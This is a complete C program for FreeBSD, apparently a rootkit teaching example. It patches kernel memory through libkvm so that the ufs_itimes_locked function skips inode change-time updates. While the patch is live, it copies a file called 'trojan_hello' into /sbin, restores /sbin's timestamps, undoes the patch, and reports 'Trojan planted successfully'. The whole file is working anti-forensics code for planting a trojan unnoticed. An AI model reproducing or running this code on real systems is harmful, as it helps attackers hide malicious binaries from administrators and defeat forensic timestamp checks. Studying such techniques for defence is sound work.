#include <errno.h>
#include <fcntl.h>
#include <kvm.h>
#include <limits.h>
#include <nlist.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>

#define SIZE 		450
#define T_NAME		"trojan_hello"
#define DESTINATION	"/sbin/."

/* Replacement Code */
unsigned char dummy[] = 
	"\x00";		/* Dummy Flag */

int main (int argc, char *argv[])
{
	int i, offset;
	char errbuf[_POSIX2_LINE_MAX];
	kvm_t *kd;
	struct nlist nl[] = { {NULL}, {NULL}, };
	unsigned char ufs_itimes_code[SIZE];

	struct stat sb;
	struct timeval time[2];

	/* Initialize kernel virtual memory access */
	kd = kvm_openfiles(NULL, NULL, NULL, O_RDWR, errbuf);
	if (kd == NULL)
	{
		fprintf(stderr, "ERROR: %s\n", errbuf);
		exit(-1);
	}

	nl[0].n_name = "ufs_itimes_locked";

	if (kvm_nlist(kd, nl) < 0)
	{
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

	if (!nl[0].n_value)
	{
		fprintf(stderr, "ERROR: Symbol %s not found!\n", nl[0].n_name);
		exit(-1);
	}

	/* Save a copy of ufs_itimes */
	if (kvm_read(kd, nl[0].n_value, ufs_itimes_code, SIZE) < 0)
	{
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

	/* Search through ufs_itimes_locked for the instruction:
	 * test $0x2,%cl
	 * This instruction checks the inode flag for IN_CHANGE = 0x2
	 * as defined in <ufs/ufs/inode.h>. We are only going to change
	 * the final byte (0x02) so that the entire IF statement is skipped. */
	for ( i = 0 ; i < SIZE - 2 ; i++ )
	{
		/* test $0x2,%cl */
		if (	ufs_itimes_code[i] 	== 0xf6 &&
			ufs_itimes_code[i+1] 	== 0xc1 &&
			ufs_itimes_code[i+2] 	== 0x02)
				offset = i+2;

	}

	/* Save /sbin/'s access and modification times */
	if (stat("/sbin", &sb) < 0)
	{
		fprintf(stderr, "STAT ERROR: %d\n", errno);
		exit(-1);
	}

	/* time[] is an array of timeval's, but stat returns timespec's
	 * timespec = seconds + nanoseconds
	 * timeval  = seconds + microseconds */
	time[0].tv_sec 	= (time_t)sb.st_atim.tv_sec;
	time[0].tv_usec	= (long)sb.st_atim.tv_nsec / 1000;
	time[1].tv_sec 	= (time_t)sb.st_mtim.tv_sec;
	time[1].tv_usec	= (long)sb.st_mtim.tv_nsec / 1000;

	/* Patch ufs_itimes_locked with dummy byte */
	if (kvm_write(kd, nl[0].n_value + offset, dummy, 1) < 0)
	{
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

	/* Copy T_NAME into DESTINATION */
	char string[] = "cp" " " T_NAME " " DESTINATION;
	system(string);

	/* Roll back /sbin/'s access and modification times */
	if (utimes("/sbin", (struct timeval *)&time) < 0)
	{
		fprintf(stderr, "UTIMES ERROR: %d\n", errno);
		exit(-1);
	}

	/* Restore ufs_itimes_locked */
	if (kvm_write(kd, nl[0].n_value + offset, &ufs_itimes_code[offset], 1) < 0)
	{
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

	/* Close kd */
	if (kvm_close(kd) < 0)
	{
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

	/* Print out a debug message, indicating our success */
	printf("Trojan planted successfully...\n");

	exit(0);
}
